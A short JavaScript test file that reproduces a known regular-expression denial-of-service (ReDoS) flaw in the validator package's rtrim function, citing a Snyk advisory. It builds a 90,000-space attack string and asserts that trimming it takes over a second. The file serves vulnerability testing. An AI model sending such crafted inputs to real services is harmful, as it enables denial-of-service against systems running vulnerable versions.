function build_attack(n) {
    var ret = ""
    for (var i = 0; i < n; i++) {
        ret += " "
    }

    return ret+"◎";
}


//https://snyk.io/vuln/SNYK-JS-VALIDATOR-1090600
test("ReDos in validator", () => {
    const validator = require("validator")
    const measureTime = require("./utils").measureTime;
            
    var attack_str = build_attack(90000)


    let t = measureTime(function () {
        validator.rtrim(attack_str);
        });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  